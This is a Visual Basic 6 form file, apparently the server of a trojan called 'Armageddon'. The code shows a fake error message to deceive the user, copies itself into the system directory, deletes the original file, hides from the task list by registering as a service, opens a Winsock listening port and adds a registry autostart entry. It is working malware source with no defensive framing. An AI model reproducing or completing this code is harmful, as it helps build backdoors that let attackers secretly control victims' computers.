VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmServer 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Server"
   ClientHeight    =   1725
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   2115
   Icon            =   "frmServer.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1725
   ScaleWidth      =   2115
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin MSWinsockLib.Winsock tcpServer 
      Left            =   780
      Top             =   1200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.DriveListBox drvMain 
      Height          =   315
      Left            =   60
      TabIndex        =   2
      Top             =   60
      Width           =   1935
   End
   Begin VB.FileListBox filMain 
      Height          =   285
      Left            =   60
      TabIndex        =   1
      Top             =   780
      Width           =   1935
   End
   Begin VB.DirListBox dirMain 
      Height          =   315
      Left            =   60
      TabIndex        =   0
      Top             =   420
      Width           =   1935
   End
End
Attribute VB_Name = "frmServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'***************************************
'*      TITLE: ARMAGEDDON SERVER       *
'* PROGRAMMER: BARRY FRENCH A.K.A (EC) *
'*       USE WITH: ARMAGEDDON          *
'***************************************

Option Explicit

Private Sub Form_Load()
On Error Resume Next

Dim sKill As String

    'If its not the server in the system directory then copy itself
    'and execute the copied server then end the first one
    If App.Path <> FindSysDir Then
        
        'Shows the fake error message (ShowFakeMessage)
        ShowFakeMessage
        
        'Adds the kill path to the text file
        If FindMelt = True Then
            WriteKillPath
        End If
        
        'Copies the server to the system directory
        CopyMe
        
        'Simply waits until the server is there
        Do Until Dir(FindSysDir & "\" & App.EXEName & ".exe") <> ""
            DoEvents
        Loop
        
        'Opens the server installed in system folder
        Shell FindSysDir & "\" & App.EXEName & ".exe"
        
        End
    Else
        If App.PrevInstance = True Then End
        
        If FindMelt = True Then
        
            'System server opens text file to find the kill path
            FindKillPath
            
        End If
    
    End If
    
    'Shoud the server be hidden from the task list
    'If running on Win2K platform hopefully illiegal errors might
    'not happen and the program may just exit instead depending
    'on the installed service pack
    If FindTask = True Then

        If MakeMeService(1) = False Then
            MsgBox "A fatal error has occured. The program will now exit", vbOKOnly + vbCritical, "Fatal Error"
            End
        End If
        
    Else
    
        If MakeMeService(0) = False Then
            MsgBox "A fatal error has occured. The program will now exit", vbOKOnly + vbCritical, "Fatal Error"
            End
        End If
        
    End If
    
    'Closes all open files
    Reset
    
    'Find which port Winsock should listen on
    tcpServer.LocalPort = FindPort
    
    'Finds which startup method is used
    Select Case FindStartMethod
    
        Case 1
        MakeRegStart App.Path & "\" & App.EXEName, FindKeyName
        
        Case 2
        'Put code for start menu autostart in here
        
        Case 3
        MakeRegStart App.Path & "\" & App.EXEName, FindKeyName
        'Code for Case 2 in here as well
        
    End Select
End Sub

Private Sub ShowFakeMessage()
Dim lIcon As Long
Dim lButtons As Long

Dim sTitle As String
Dim sMessage As String
    
Dim lDesk As Long

    lDesk = GetDesktopWindow
    
    'Uses Findmessage to function to retrieve the fake message
    If FindMessage(lIcon, lButtons, sTitle, sMessage) = True Then
        MessageBox lDesk, sMessage, sTitle, lIcon Or lButtons
    End If
End Sub

Private Sub WriteKillPath()
    Open FindSysDir & "\" & "Path.txt" For Output As #2
        Print #2, App.Path & "\" & App.EXEName & ".exe"
    Close #2
End Sub

Private Sub FindKillPath()
On Error Resume Next

Dim sKill As String
    
    Open FindSysDir & "\" & "Path.txt" For Input As #2
        Input #2, sKill
    Close #2
    
    Do Until Dir(sKill) = ""
        Kill sKill
        DoEvents
    Loop
    
    Kill FindSysDir & "\" & "Path.txt"
End Sub
